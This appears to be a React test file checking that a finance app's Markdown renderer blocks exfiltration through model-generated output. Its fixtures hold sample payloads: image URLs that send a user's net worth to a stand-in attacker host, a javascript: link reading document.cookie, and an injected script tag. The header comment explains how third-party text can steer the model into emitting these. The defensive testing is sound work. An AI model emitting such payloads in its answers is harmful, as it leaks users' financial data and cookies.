import React from 'react';
import { render, screen } from '@testing-library/react';
import MarkdownRenderer from '../components/MarkdownRenderer';

/**
 * Everything this component renders is model-generated, and the model reads
 * web snippets and transaction descriptions written by third parties. An
 * image loads without a click, so a Markdown image is a way to send whatever
 * sits in its URL to whoever picked the host.
 */
describe('MarkdownRenderer third-party content safety', () => {
  it('does not render an image, however the answer asks for one', () => {
    const { container } = render(
      <MarkdownRenderer>
        {'Your balance is $1,234. ![](https://attacker.example/pixel?net_worth=1234)'}
      </MarkdownRenderer>
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('keeps the alt text, which is all a legitimate image would have carried', () => {
    render(<MarkdownRenderer>{'![Rate chart](https://example.com/chart.png)'}</MarkdownRenderer>);

    expect(screen.getByText('Rate chart')).toBeInTheDocument();
  });

  it('renders reference-style images as nothing as well', () => {
    const { container } = render(
      <MarkdownRenderer>
        {'![tracker][ref]\n\n[ref]: https://attacker.example/beacon.gif'}
      </MarkdownRenderer>
    );

    expect(container.querySelector('img')).toBeNull();
  });

  it('renders links but never hands the destination our page', () => {
    const { container } = render(
      <MarkdownRenderer>{'[Federal Reserve](https://federalreserve.gov)'}</MarkdownRenderer>
    );

    const link = container.querySelector('a');
    expect(link).not.toBeNull();
    expect(link).toHaveAttribute('href', 'https://federalreserve.gov');
    expect(link?.getAttribute('rel')).toContain('noopener');
    expect(link?.getAttribute('rel')).toContain('noreferrer');
    expect(link?.getAttribute('target')).toBe('_blank');
  });

  it('does not produce a javascript: link', () => {
    const { container } = render(
      // eslint-disable-next-line no-script-url
      <MarkdownRenderer>{'[click me](javascript:alert(document.cookie))'}</MarkdownRenderer>
    );

    // react-markdown empties the href; we must not leave a clickable <a href="">.
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('click me');
  });

  it('does not render raw HTML embedded in an answer', () => {
    const { container } = render(
      <MarkdownRenderer>
        {'<img src="https://attacker.example/x.gif" /><script>alert(1)</script>'}
      </MarkdownRenderer>
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
  });

  it('still renders ordinary financial prose', () => {
    render(<MarkdownRenderer>{'**Key Numbers:**\n\n- Net worth: $187,547'}</MarkdownRenderer>);

    expect(screen.getByText('Key Numbers:')).toBeInTheDocument();
    expect(screen.getByText(/187,547/)).toBeInTheDocument();
  });
});
